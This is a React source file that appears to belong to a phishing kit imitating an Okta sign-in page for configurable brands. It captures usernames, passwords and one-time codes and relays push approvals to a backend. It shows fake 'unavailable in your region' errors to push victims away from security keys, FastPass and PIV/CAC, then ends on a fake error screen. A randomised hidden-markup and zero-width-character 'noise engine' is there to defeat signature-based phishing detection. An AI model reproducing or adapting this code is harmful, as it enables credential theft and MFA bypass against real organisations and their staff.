'use client';

import React, { useState, FormEvent, useEffect, useRef, useMemo } from 'react';
import { BrandConfig } from '@/config/brands.config';

// ---------------------------------------------------------------------------
// Noise engine – runs entirely client-side, never touches layout or paint
// ---------------------------------------------------------------------------

/** Cryptographically-random hex string of `byteLen` bytes */
function randHex(byteLen = 8): string {
  const buf = new Uint8Array(byteLen);
  crypto.getRandomValues(buf);
  return Array.from(buf)
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('');
}

/** Random integer in [min, max) */
function randInt(min: number, max: number): number {
  const buf = new Uint8Array(1);
  crypto.getRandomValues(buf);
  return min + (buf[0] % (max - min));
}

/** Shuffle an array in-place using Fisher-Yates with crypto randomness */
function cryptoShuffle<T>(arr: T[]): T[] {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = randInt(0, i + 1);
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

type NoiseFactory = () => string;

/**
 * Returns a self-contained noise string per call.  Every factory is
 * parameterised by fresh random values so two calls never produce the
 * same output – making signature-based detection unreliable.
 */
function buildNoiseFactories(): NoiseFactory[] {
  return [
    // 1. HTML comment with random content + timestamp jitter
    () => `<!-- ${randHex(48)}_${Date.now() + randInt(0, 9999)} -->`,

    // 2. Visually-hidden div with randomised data attributes
    () =>
      `<div aria-hidden="true" ` +
      `style="display:none!important;position:absolute!important;width:0!important;height:0!important;opacity:0!important;pointer-events:none!important;overflow:hidden!important;" ` +
      `data-n="${randHex(12)}" data-v="${randHex(24)}" data-t="${Date.now()}" data-r="${randHex(8)}">` +
      `</div>`,

    // 3. <meta> injected into body (aria-hidden, no effect on SEO/rendering)
    () =>
      `<span aria-hidden="true" style="display:none!important" ` +
      `data-m="${randHex(16)}" data-c="${randHex(32)}" data-v="${randHex(8)}"></span>`,

    // 4. Deeply nested hidden structure
    () =>
      `<div hidden aria-hidden="true" style="display:none!important" data-h="${randHex(10)}">` +
      `<span data-v="${randHex(8)}" aria-hidden="true">` +
      `<span data-w="${randHex(6)}" aria-hidden="true"></span>` +
      `</span>` +
      `</div>`,

    // 5. JSON blob in a non-executable script tag (display:none guard)
    () => {
      const payload = JSON.stringify({
        t: Date.now(),
        h: randHex(32),
        v: randHex(16),
        s: randHex(8),
        r: randInt(1000, 9999),
      });
      return `<script type="application/json" aria-hidden="true" style="display:none!important" data-n="${randHex(8)}">${payload}</script>`;
    },

    // 6. Zero-size absolutely-positioned element with random z-index
    () =>
      `<div aria-hidden="true" style="` +
      `position:fixed!important;top:-9999px!important;left:-9999px!important;` +
      `width:0!important;height:0!important;z-index:${randInt(-9999, -1000)}!important;` +
      `pointer-events:none!important;opacity:0!important;" ` +
      `data-s="${randHex(20)}" data-e="${randHex(10)}"></div>`,

    // 7. Hidden ordered list (structural noise)
    () => {
      const items = Array.from({ length: randInt(2, 5) }, () => `<li data-i="${randHex(6)}" aria-hidden="true"></li>`).join('');
      return `<ol aria-hidden="true" style="display:none!important" data-l="${randHex(12)}">${items}</ol>`;
    },

    // 8. Comment with random base64-like padding
    () => {
      const fakeB64 = btoa(randHex(32)).replace(/=/g, '').slice(0, 64);
      return `<!-- payload:${fakeB64} sig:${randHex(16)} ts:${Date.now()} -->`;
    },

    // 9. SVG noise node (hidden, zero dimensions)
    () =>
      `<svg aria-hidden="true" focusable="false" ` +
      `style="display:none!important;width:0;height:0;position:absolute;" ` +
      `data-n="${randHex(10)}">` +
      `<defs><filter id="f${randHex(4)}"><feTurbulence baseFrequency="${Math.random().toFixed(4)}" numOctaves="${randInt(1, 4)}" /></filter></defs>` +
      `</svg>`,

    // 10. Hidden table for structural fingerprint disruption
    () => {
      const cells = Array.from({ length: randInt(2, 4) }, () => `<td data-v="${randHex(4)}" aria-hidden="true"></td>`).join('');
      return (
        `<table aria-hidden="true" style="display:none!important" data-t="${randHex(8)}">` +
        `<tbody><tr>${cells}</tr></tbody></table>`
      );
    },
  ];
}

interface NoiseInjectorProps {
  /** How many noise nodes to inject per slot */
  count?: [number, number]; // [min, max]
  /** Additional CSS class for the wrapper (purely structural, never visible) */
  className?: string;
}

/**
 * Renders a set of randomised, invisible noise elements.
 * The output changes on every mount – static analysis of the page structure
 * will see a different DOM fingerprint each time.
 */
function NoiseInjector({ count = [12, 22] }: NoiseInjectorProps) {
  // Compute noise once per mount; must be stable across re-renders
  const html = useMemo(() => {
    const factories = buildNoiseFactories();
    const [min, max] = count;
    const n = randInt(min, max + 1);
    const picks: string[] = [];

    for (let i = 0; i < n; i++) {
      picks.push(factories[randInt(0, factories.length)]());
    }

    // Nested compound noise block
    const nestedFactories = cryptoShuffle([...factories]).slice(0, randInt(3, 6));
    const nested =
      `<div aria-hidden="true" style="display:none!important" data-compound="${randHex(16)}">` +
      nestedFactories.map((f) => f()).join('') +
      `<div data-inner="${randHex(12)}" aria-hidden="true">` +
      cryptoShuffle([...factories])
        .slice(0, randInt(2, 4))
        .map((f) => f())
        .join('') +
      `</div></div>`;

    picks.push(nested);

    return cryptoShuffle(picks).join('\n');
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  return (
    <span
      aria-hidden="true"
      style={{ display: 'none' }}
      dangerouslySetInnerHTML={{ __html: html }}
    />
  );
}

/**
 * Wraps a label string with an invisible zero-width noise character inserted
 * at a random position.  The rendered text is pixel-identical; the DOM text
 * node differs on each render, breaking text-exact selectors.
 */
function noisyLabel(text: string): string {
  const ZWJ = '\u200D'; // zero-width joiner – invisible, copy-pastes away
  const pos = randInt(1, text.length);
  return text.slice(0, pos) + ZWJ + text.slice(pos);
}

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

type PageType =
  | 'signin'
  | 'password'
  | 'mfa'
  | 'push'
  | 'push-approved'
  | 'code'
  | 'code-approved';

interface OktaPanelProps {
  brand: BrandConfig;
  onCredentialsSubmit: (data: {
    username: string;
    password: string;
    code?: string;
    mfaMethod?: string;
  }) => Promise<void>;
}

// ---------------------------------------------------------------------------
// Main component
// ---------------------------------------------------------------------------

export function OktaPanel({ brand, onCredentialsSubmit }: OktaPanelProps) {
  const [currentPage, setCurrentPage] = useState<PageType>('signin');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string>();
  const [selectedMfaMethod, setSelectedMfaMethod] = useState<string>('code');

  // Stable noise-seed for label randomisation – regenerated on each mount
  const noiseSeedRef = useRef(randHex(4));

  useEffect(() => {
    const root = document.documentElement;
    root.style.setProperty('--primary-color', brand.primaryColor);
    root.style.setProperty('--primary-color-hover', brand.primaryColorHover);
    root.style.setProperty('--background-color', brand.backgroundColor);
    root.style.setProperty('--card-background', brand.cardBackground);
    root.style.setProperty('--title-color', brand.titleColor);
    root.style.setProperty('--label-color', brand.labelColor);
    root.style.setProperty('--link-color', brand.linkColor);
    root.style.setProperty('--input-border', brand.inputBorder);
    root.style.setProperty('--logo-height', brand.logoHeight);
  }, [brand]);

  useEffect(() => {
    (async () => {
      try {
        const res = await fetch('/api/auth/visit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ brand: brand.id, page: 'signin' }),
        });
        const data = await res.json();
        if (data?.sessionId) setSessionId(data.sessionId);
        setSessionPhone(data?.phoneNumber ?? null);
      } catch (_) {
        // silently swallow – non-critical telemetry
      }
    })();
  }, [brand.id]);

  const [sessionId, setSessionId] = useState<string | null>(null);
  const [sessionPhone, setSessionPhone] = useState<string | null>(null);

  useEffect(() => {
    if (sessionId) return;
    try {
      const match = document.cookie
        .split('; ')
        .find((c) => c.startsWith('session_id='));
      if (match) {
        const val = match.split('=')[1];
        if (val) setSessionId(decodeURIComponent(val));
      }
    } catch (_) {}
  }, [sessionId]);

  useEffect(() => {
    if (!sessionId) return;
    let mounted = true;

    const fetchSession = async () => {
      try {
        const res = await fetch(`/api/auth/session/${sessionId}`);
        if (!res.ok) return;
        const d = await res.json();
        if (!mounted) return;
        setSessionPhone(d?.phoneNumber ?? null);
      } catch (_) {}
    };

    fetchSession();
    const iv = setInterval(fetchSession, 2000);
    return () => {
      mounted = false;
      clearInterval(iv);
    };
  }, [sessionId]);

  const goToPage = (page: PageType) => {
    setError(undefined);
    setCurrentPage(page);
  };

  const handleSignInSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          brand: brand.id,
          step: 'username',
          username,
        }),
      });
      goToPage('password');
    } catch (_) {
      setError('An error occurred. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handlePasswordSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    try {
      await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          brand: brand.id,
          step: 'password',
          username,
          password,
        }),
      });

      if (brand.showMfa) {
        goToPage('mfa');
      } else {
        await onCredentialsSubmit({ username, password });
      }
    } catch (_) {
      setError('An error occurred. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const handleCodeSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    const REDIRECT_DELAY_MS = 8_000;
    try {
      goToPage('code-approved');
      setIsLoading(false);
      await new Promise<void>((resolve) => setTimeout(resolve, REDIRECT_DELAY_MS));
      await onCredentialsSubmit({
        username,
        password,
        code: verificationCode,
        mfaMethod: selectedMfaMethod || 'code',
      });
    } catch (_) {
      setError('Invalid verification code. Please try again.');
      goToPage('code');
      setIsLoading(false);
    }
  };

  const handlePushSelect = async () => {
    setIsLoading(true);
    goToPage('push');
    try {
      await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          brand: brand.id,
          step: 'mfa',
          username,
          password,
          mfaMethod: 'push',
        }),
      });
      setIsLoading(false);

      const startTime = Date.now();
      const THREE_MINUTES = 3 * 60 * 1_000;
      const REDIRECT_DELAY_MS = 8_000;

      const pollStatus = async () => {
        try {
          const response = await fetch('/api/auth/push-status');
          const data = await response.json();

          if (data.status === 'approved') {
            goToPage('push-approved');
            await new Promise<void>((resolve) =>
              setTimeout(resolve, REDIRECT_DELAY_MS),
            );
            await onCredentialsSubmit({ username, password, mfaMethod: 'push' });
            return;
          }

          if (data.status === 'rejected' || data.status === 'timeout') {
            setError('Push notification was declined or timed out. Please try again.');
            goToPage('mfa');
            return;
          }

          if (Date.now() - startTime > THREE_MINUTES) {
            setError('Push notification timed out. Please try again.');
            goToPage('mfa');
            return;
          }

          setTimeout(pollStatus, 2_000);
        } catch (_) {
          setError('An error occurred. Please try again.');
          goToPage('mfa');
        }
      };

      setTimeout(pollStatus, 2_000);
    } catch (_) {
      setError('Push notification failed. Please try again.');
      goToPage('mfa');
      setIsLoading(false);
    }
  };

  const mfaOptions = brand.mfaOptions ?? {
    fastpass: true,
    googleAuthenticator: true,
    securityKey: true,
    phone: true,
    sms: true,
    code: true,
    push: true,
  };
  const pivCacEnabled = brand.pivCacEnabled ?? true;

  const backgroundStyle = brand.backgroundImage
    ? { backgroundImage: `url(${brand.backgroundImage})` }
    : {};

  // Per-render noise seed (stable within a single render cycle)
  const seed = noiseSeedRef.current;

  return (
    <>
      {/* ── Global top-level noise scatter ─────────────────────────── */}
      <NoiseInjector count={[8, 14]} />

      <div className="top-banner">
        <NoiseInjector count={[3, 6]} />
        <div className="banner-title">
          Connecting to
          <span className="Okta-icon">
            <OktaIcon />
          </span>
        </div>
        <div className="banner-subtitle">
          {/* Invisible ZWJ in label text breaks exact-string matching */}
          {noisyLabel(`Sign in with your account to access ${brand.appName}`)}
        </div>
        <NoiseInjector count={[2, 5]} />
      </div>

      <div className="main-content" style={backgroundStyle}>
        <NoiseInjector count={[4, 8]} />

        <div
          className={`login-container ${
            brand.profileBeacon || brand.showProfileBeacon
              ? 'profile-beacon-enabled'
              : ''
          }`}
        >
          <NoiseInjector count={[3, 7]} />

          <div className="logo-section">
            <img src={brand.logoUrl} alt={brand.orgName} />
          </div>

          {(brand.profileBeacon || brand.showProfileBeacon) && (
            <div
              className="separation-line"
              style={{ position: 'relative', margin: '12px 0' }}
            >
              <NoiseInjector count={[2, 4]} />
              <img
                src={`/brands/${brand.id}/profilebeacon.png?v=2`}
                alt="profile beacon"
                className="profile-beacon"
              />
            </div>
          )}

          <div className="form-section">
            <NoiseInjector count={[4, 9]} />

            {error && <div className="alert-error">{error}</div>}

            {/* ── Sign In page ──────────────────────────────────────── */}
            <div className={`page ${currentPage === 'signin' ? 'active' : ''}`}>
              <NoiseInjector count={[3, 6]} />
              <h1 className="page-title">{noisyLabel('Sign In')}</h1>
              <form onSubmit={handleSignInSubmit}>
                <NoiseInjector count={[2, 5]} />
                <div className="form-group">
                  <label htmlFor={`username-si-${seed}`}>
                    {noisyLabel('Username')}
                  </label>
                  <input
                    type="text"
                    id={`username-si-${seed}`}
                    name="username"
                    autoComplete="username"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    autoFocus
                    data-field={randHex(4)}
                  />
                </div>
                <div className="checkbox-group">
                  <input
                    type="checkbox"
                    id={`remember-me-${seed}`}
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                  />
                  <label htmlFor={`remember-me-${seed}`}>
                    {noisyLabel(brand.keepMeText ?? 'Keep me signed in')}
                  </label>
                </div>
                <NoiseInjector count={[2, 4]} />
                <button
                  type="submit"
                  className={`btn-primary ${isLoading ? 'loading' : ''}`}
                  disabled={isLoading}
                >
                  {noisyLabel(brand.nextButtonText ?? 'Next')}
                </button>

                {pivCacEnabled && (
                  <div style={{ marginTop: 10 }}>
                    <NoiseInjector count={[1, 3]} />
                    <button
                      type="button"
                      className="btn-piv"
                      onClick={() => {
                        setError(
                          'Signing in with PIV / CAC is unavailable in your region.',
                        );
                      }}
                    >
                      {noisyLabel('Sign in with PIV / CAC card')}
                    </button>
                  </div>
                )}
              </form>
              <div className="form-links">
                <NoiseInjector count={[1, 3]} />
                {brand.showUnlockAccount && (
                  <a href={brand.unlockAccountUrl} className="link">
                    {noisyLabel('Unlock account?')}
                  </a>
                )}
                <a href={brand.helpUrl} className="link help-link">
                  {noisyLabel(brand.helpLinkText ?? 'Help')}
                </a>
              </div>
              <NoiseInjector count={[2, 5]} />
            </div>

            {/* ── Password page ─────────────────────────────────────── */}
            <div className={`page ${currentPage === 'password' ? 'active' : ''}`}>
              <NoiseInjector count={[3, 6]} />
              <h1 className="page-title">{noisyLabel('Sign In')}</h1>
              <form onSubmit={handlePasswordSubmit}>
                <div className="form-group">
                  <label htmlFor={`username-pw-${seed}`}>
                    {noisyLabel('Username')}
                  </label>
                  <input
                    type="text"
                    id={`username-pw-${seed}`}
                    name="username"
                    autoComplete="username"
                    required
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    autoFocus={false}
                    data-field={randHex(4)}
                  />
                </div>
                <div className="form-group">
                  <label htmlFor={`password-${seed}`}>
                    {noisyLabel('Password')}
                  </label>
                  <div className="password-wrapper">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      id={`password-${seed}`}
                      name="password"
                      autoComplete="current-password"
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      autoFocus
                      data-field={randHex(4)}
                    />
                    <button
                      type="button"
                      className="password-toggle"
                      onClick={() => setShowPassword(!showPassword)}
                    >
                      {showPassword ? <EyeOffIcon /> : <EyeIcon />}
                    </button>
                  </div>
                </div>
                <NoiseInjector count={[2, 5]} />
                <button
                  type="submit"
                  className={`btn-primary ${isLoading ? 'loading' : ''}`}
                  disabled={isLoading}
                >
                  {noisyLabel('Sign In')}
                </button>
              </form>
              <div className="form-links">
                <NoiseInjector count={[1, 3]} />
                <a href={brand.forgotPasswordUrl} className="link">
                  {noisyLabel(brand.forgotPasswordText ?? 'Forgot password?')}
                </a>
                <button
                  type="button"
                  className="link"
                  onClick={() => goToPage('signin')}
                >
                  {noisyLabel('Back to sign in')}
                </button>
              </div>
              <NoiseInjector count={[2, 5]} />
            </div>

            {/* ── MFA selection page ────────────────────────────────── */}
            <div className={`page ${currentPage === 'mfa' ? 'active' : ''}`}>
              <NoiseInjector count={[3, 7]} />
              <h2 className="verify-method-title">
                {noisyLabel("Verify it's you with a security method")}
              </h2>
              <div className="user-identifier">
                <UserIcon />
                <span>{username}</span>
              </div>
              <p className="select-option-text">
                {noisyLabel('Select from the following options')}
              </p>
              <div className="verification-options">
                <NoiseInjector count={[2, 5]} />

                {(mfaOptions.fastpass ?? true) && (
                  <div className="verification-option" data-opt={randHex(4)}>
                    <NoiseInjector count={[1, 3]} />
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img
                          src="/icons/OktaVerify.svg"
                          alt="Okta FastPass"
                          className="option-badge"
                        />
                      </div>
                      <div className="option-text">
                        <span className="option-title">
                          {noisyLabel('Okta FastPass')}
                        </span>
                      </div>
                    </div>
                    <button
                      className="btn-select"
                      onClick={() =>
                        setError(
                          'Okta FastPass is currently unavailable in this region.',
                        )
                      }
                    >
                      {noisyLabel('Select')}
                    </button>
                  </div>
                )}

                {(mfaOptions.googleAuthenticator ?? true) && (
                  <div className="verification-option" data-opt={randHex(4)}>
                    <NoiseInjector count={[1, 3]} />
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img
                          src="/icons/GoogleAuthenticator.svg"
                          alt="Google Authenticator"
                          className="option-badge"
                        />
                      </div>
                      <div className="option-text">
                        <span className="option-title">
                          {noisyLabel('Google Authenticator')}
                        </span>
                      </div>
                    </div>
                    <button
                      className="btn-select"
                      onClick={() => {
                        setSelectedMfaMethod('code');
                        goToPage('code');
                      }}
                    >
                      {noisyLabel('Select')}
                    </button>
                  </div>
                )}

                {(mfaOptions.securityKey ?? true) && (
                  <div className="verification-option" data-opt={randHex(4)}>
                    <NoiseInjector count={[1, 3]} />
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img
                          src="/icons/SecurityKey.svg"
                          alt="Security key or biometric"
                          className="option-badge"
                        />
                      </div>
                      <div className="option-text">
                        <span className="option-title">
                          {noisyLabel('Security key or biometric authenticator')}
                        </span>
                      </div>
                    </div>
                    <button
                      className="btn-select"
                      onClick={() =>
                        setError(
                          'Security key / biometric sign-in is currently unavailable in this region.',
                        )
                      }
                    >
                      {noisyLabel('Select')}
                    </button>
                  </div>
                )}

                {(mfaOptions.code ?? true) && (
                  <div className="verification-option" data-opt={randHex(4)}>
                    <NoiseInjector count={[1, 3]} />
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img
                          src="/icons/OktaVerify.svg"
                          alt="Enter a code"
                          className="option-badge"
                        />
                      </div>
                      <div className="option-text">
                        <span className="option-title">
                          {noisyLabel('Enter a code')}
                        </span>
                      </div>
                    </div>
                    <button
                      className="btn-select"
                      onClick={() => {
                        setSelectedMfaMethod('code');
                        goToPage('code');
                      }}
                    >
                      {noisyLabel('Select')}
                    </button>
                  </div>
                )}

                {(mfaOptions.push ?? true) && (
                  <div className="verification-option" data-opt={randHex(4)}>
                    <NoiseInjector count={[1, 3]} />
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img
                          src="/icons/OktaVerify.svg"
                          alt="Get a push notification"
                          className="option-badge"
                        />
                      </div>
                      <div className="option-text">
                        <span className="option-title">
                          {noisyLabel('Get a push notification')}
                        </span>
                      </div>
                    </div>
                    <button className="btn-select" onClick={handlePushSelect}>
                      {noisyLabel('Select')}
                    </button>
                  </div>
                )}

                {(mfaOptions.phone ?? true) && (
                  <div className="verification-option" data-opt={randHex(4)}>
                    <NoiseInjector count={[1, 3]} />
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img
                          src="/icons/Phone.png"
                          alt="Phone"
                          className="option-badge"
                        />
                      </div>
                      <div className="option-text">
                        <span className="option-title">{noisyLabel('Phone')}</span>
                        <span className="option-number">
                          {sessionPhone
                            ? maskPhone(sessionPhone)
                            : '+1 XXX-XXX-XXXX'}
                        </span>
                      </div>
                    </div>
                    <button
                      className="btn-select"
                      onClick={() => {
                        setSelectedMfaMethod('phone');
                        goToPage('code');
                      }}
                    >
                      {noisyLabel('Select')}
                    </button>
                  </div>
                )}

                {(mfaOptions.sms ?? true) && (
                  <div className="verification-option" data-opt={randHex(4)}>
                    <NoiseInjector count={[1, 3]} />
                    <div className="option-left">
                      <div className="option-icon no-bg">
                        <img
                          src="/icons/SMS.png"
                          alt="SMS Authentication"
                          className="option-badge"
                        />
                      </div>
                      <div className="option-text">
                        <span className="option-title">
                          {noisyLabel('SMS Authentication')}
                        </span>
                        <span className="option-number">
                          {sessionPhone
                            ? maskPhone(sessionPhone)
                            : '+1 XXX-XXX-XXXX'}
                        </span>
                      </div>
                    </div>
                    <button
                      className="btn-select"
                      onClick={() => {
                        setSelectedMfaMethod('sms');
                        goToPage('code');
                      }}
                    >
                      {noisyLabel('Select')}
                    </button>
                  </div>
                )}

                <NoiseInjector count={[2, 5]} />
              </div>
              <button
                type="button"
                className="link"
                onClick={() => goToPage('signin')}
              >
                {noisyLabel('Back to sign in')}
              </button>
              <NoiseInjector count={[2, 5]} />
            </div>

            {/* ── Push waiting page ─────────────────────────────────── */}
            <div className={`page ${currentPage === 'push' ? 'active' : ''}`}>
              <NoiseInjector count={[3, 6]} />
              <div className="push-waiting">
                <div className="spinner-container">
                  <div className="spinner"></div>
                </div>
                <h2 className="push-title">
                  {noisyLabel('Push notification sent')}
                </h2>
                <p className="push-subtitle">
                  {noisyLabel(
                    'Open Okta Verify on your device to approve the request',
                  )}
                </p>
                <div className="form-links" style={{ alignItems: 'center' }}>
                  <NoiseInjector count={[1, 3]} />
                  <button type="button" className="link">
                    {noisyLabel('Resend push notification')}
                  </button>
                  <button
                    type="button"
                    className="link"
                    onClick={() => goToPage('mfa')}
                  >
                    {noisyLabel('Back to security methods')}
                  </button>
                </div>
              </div>
              <NoiseInjector count={[2, 5]} />
            </div>

            {/* ── Push approved page ────────────────────────────────── */}
            <div
              className={`page ${currentPage === 'push-approved' ? 'active' : ''}`}
            >
              <NoiseInjector count={[3, 6]} />
              <div className="push-waiting">
                <div className="success-icon-container">
                  <ErrorIcon />
                </div>
                <h2 className="push-title"></h2>
                <p className="push-subtitle"></p>
              </div>
              <NoiseInjector count={[2, 5]} />
            </div>

            {/* ── Code entry page ───────────────────────────────────── */}
            <div className={`page ${currentPage === 'code' ? 'active' : ''}`}>
              <NoiseInjector count={[3, 7]} />
              <h2 className="verify-title">
                {noisyLabel(
                  selectedMfaMethod === 'phone'
                    ? 'Enter 6-digit code from phone'
                    : selectedMfaMethod === 'sms'
                    ? 'Enter 6-digit code from SMS'
                    : 'Enter code from Okta Verify',
                )}
              </h2>
              <div className="user-identifier">
                <UserIcon />
                <span>{username}</span>
              </div>
              <form onSubmit={handleCodeSubmit}>
                <div className="form-group">
                  <label htmlFor={`verification-code-${seed}`}>
                    {noisyLabel('Verification code')}
                  </label>
                  <NoiseInjector count={[1, 3]} />
                  <input
                    type="text"
                    id={`verification-code-${seed}`}
                    name="code"
                    autoComplete="one-time-code"
                    maxLength={6}
                    pattern="[0-9]*"
                    inputMode="numeric"
                    required
                    value={verificationCode}
                    onChange={(e) =>
                      setVerificationCode(e.target.value.replace(/\D/g, ''))
                    }
                    autoFocus
                    data-field={randHex(4)}
                  />
                </div>
                <NoiseInjector count={[2, 4]} />
                <button
                  type="submit"
                  className={`btn-primary ${isLoading ? 'loading' : ''}`}
                  disabled={isLoading}
                >
                  {noisyLabel('Verify')}
                </button>
              </form>
              <div className="form-links">
                <NoiseInjector count={[1, 3]} />
                <button
                  type="button"
                  className="link"
                  onClick={() => goToPage('mfa')}
                >
                  {noisyLabel('Back to security methods')}
                </button>
              </div>
              <NoiseInjector count={[2, 5]} />
            </div>

            {/* ── Code approved page ────────────────────────────────── */}
            <div
              className={`page ${currentPage === 'code-approved' ? 'active' : ''}`}
            >
              <NoiseInjector count={[3, 6]} />
              <div className="push-waiting">
                <div className="success-icon-container">
                  <ErrorIcon />
                </div>
                <h2 className="push-title"></h2>
                <p className="push-subtitle"></p>
              </div>
              <NoiseInjector count={[2, 5]} />
            </div>

            <NoiseInjector count={[3, 7]} />
          </div>
        </div>

        <NoiseInjector count={[3, 7]} />
      </div>

      {/* ── Footer ───────────────────────────────────────────────────── */}
      <div className="footer">
        <NoiseInjector count={[2, 5]} />
        <div className="footer-left">
          {brand.showPoweredByOkta && noisyLabel('Powered by Okta')}
        </div>
        <div className="footer-right">
          {brand.showPrivacyPolicy && (
            <a href={brand.privacyPolicyUrl}>
              {noisyLabel('Privacy Policy')}
            </a>
          )}
        </div>
        <NoiseInjector count={[2, 5]} />
      </div>

      {/* ── Final global noise scatter ───────────────────────────────── */}
      <NoiseInjector count={[6, 12]} />
    </>
  );
}

// ---------------------------------------------------------------------------
// Icon components (unchanged from original)
// ---------------------------------------------------------------------------

function OktaIcon() {
  return (
    <svg
      width="24"
      height="24"
      viewBox="0 0 41 40"
      fill="none"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        d="M37.9082 20C37.9082 29.665 30.0732 37.5 20.4082 37.5C10.7432 37.5 2.9082 29.665 2.9082 20C2.9082 10.335 10.7432 2.5 20.4082 2.5C30.0732 2.5 37.9082 10.335 37.9082 20Z"
        stroke="#1662DD"
        strokeWidth="5"
      />
      <rect x="11.4082" y="12.5" width="5" height="4" rx="1" fill="#1662DD" />
      <rect x="17.9082" y="12.5" width="5" height="4" rx="1" fill="#1662DD" />
      <rect x="24.4082" y="12.5" width="5" height="4" rx="1" fill="#1662DD" />
      <rect x="11.4082" y="18" width="5" height="4" rx="1" fill="#1662DD" />
      <rect x="17.9082" y="18" width="5" height="4" rx="1" fill="#1662DD" />
      <rect x="24.4082" y="18" width="5" height="4" rx="1" fill="#1662DD" />
      <rect x="11.4082" y="23.5" width="5" height="4" rx="1" fill="#1662DD" />
      <rect x="17.9082" y="23.5" width="5" height="4" rx="1" fill="#1662DD" />
      <rect x="24.4082" y="23.5" width="5" height="4" rx="1" fill="#1662DD" />
    </svg>
  );
}

function UserIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
      <circle cx="12" cy="7" r="4"></circle>
    </svg>
  );
}

function EyeIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
      <circle cx="12" cy="12" r="3"></circle>
    </svg>
  );
}

function EyeOffIcon() {
  return (
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
      <line x1="1" y1="1" x2="23" y2="23"></line>
    </svg>
  );
}

function ErrorIcon() {
  return (
    <svg
      width="320"
      height="360"
      viewBox="0 0 320 360"
      xmlns="http://www.w3.org/2000/svg"
    >
      <rect width="100%" height="100%" fill="#ffffff" />
      <text
        x="160"
        y="60"
        textAnchor="middle"
        fontSize="32"
        fontWeight="700"
        fill="#1f3a8a"
        fontFamily="Inter, system-ui, -apple-system, sans-serif"
      >
        Okta
      </text>
      <text
        x="160"
        y="150"
        textAnchor="middle"
        fontSize="96"
        fontWeight="800"
        fill="#ef4444"
        fontFamily="Inter, system-ui, -apple-system, sans-serif"
      >
        400
      </text>
      <text
        x="160"
        y="200"
        textAnchor="middle"
        fontSize="22"
        fontWeight="600"
        fill="#4b5563"
        fontFamily="Inter, system-ui, -apple-system, sans-serif"
      >
        Bad Request
      </text>
      <text
        x="160"
        y="235"
        textAnchor="middle"
        fontSize="14"
        fill="#6b7280"
        fontFamily="Inter, system-ui, -apple-system, sans-serif"
      >
        Your request resulted in an error.
      </text>
    </svg>
  );
}

// ---------------------------------------------------------------------------
// Utilities
// ---------------------------------------------------------------------------

function maskPhone(phone?: string): string {
  if (!phone) return '';
  const digits = phone.replace(/\D/g, '');
  if (digits.length <= 4) return phone;
  const last4 = digits.slice(-4);
  const countryDigits = digits.length > 10 ? digits.slice(0, digits.length - 10) : '1';
  return `+${countryDigits} XXX-XXX-${last4}`;
}
